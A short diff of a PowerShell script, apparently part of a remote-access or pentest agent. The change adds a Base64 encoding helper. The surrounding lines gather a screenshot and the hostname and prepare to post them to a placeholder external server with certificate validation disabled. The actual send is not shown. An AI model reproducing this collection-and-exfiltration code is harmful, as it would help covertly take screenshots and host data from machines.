@@ -9,6 +9,9 @@ $graphics.Dispose();
 $bmp.Dispose();
 $URL='SERVER_PROTOCOL://SERVER_EXTERNAL_IP:SERVER_EXTERNAL_PORT/?';
 $headers=@{'Proof'='1'};
+function Encode64{
+param($Text);if($null -eq $Text){return "IA=="}else{$Bytes=[System.Text.Encoding]::Unicode.GetBytes($Text);$EncodedText=[Convert]::ToBase64String($Bytes);return $EncodedText}
+};
 $hostname=Encode64(hostname);
 $params=@{hostname=$hostname;screenshot=$screenshot};
 [System.Net.ServicePointManager]::ServerCertificateValidationCallback = {$true};
